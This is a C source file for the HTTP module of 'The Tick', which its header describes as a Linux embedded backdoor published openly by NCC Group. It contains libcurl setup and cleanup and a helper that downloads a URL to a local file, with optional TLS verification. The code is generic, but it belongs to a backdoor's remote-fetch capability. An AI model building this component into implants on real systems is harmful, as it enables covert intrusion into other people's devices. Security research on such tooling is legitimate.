/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <string.h>
#include <signal.h>

#include <curl/curl.h>

#include "http.h"
#include "tcp.h"
#include "command.h"
#include "parser.h"

void http_init()
{
    curl_global_init(CURL_GLOBAL_ALL);
}

void http_cleanup()
{
    curl_global_cleanup();
}

// Helper function to download a file from a URL.
// Returns 0 on success, -1 on error.
int download_file(const char *url, const char *filename, long verify_peer)
{
    CURL *curl_handle = NULL;
    FILE *file = NULL;
    int success = 0;

    // Open the destination file.
    file = fopen(filename, "wb");
    if (file == NULL) {
        return -1;
    }

    // Initialize a CURL handle and fill up its options.
    curl_handle = curl_easy_init();
    curl_easy_setopt(curl_handle, CURLOPT_URL, url);
    curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 0L);
    curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, fwrite);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, file);
    curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, verify_peer);

    // Download the file.
    success = curl_easy_perform(curl_handle);

    // Clean up.
    fclose(file);
    curl_easy_cleanup(curl_handle);

    // Success!
    return success;
}
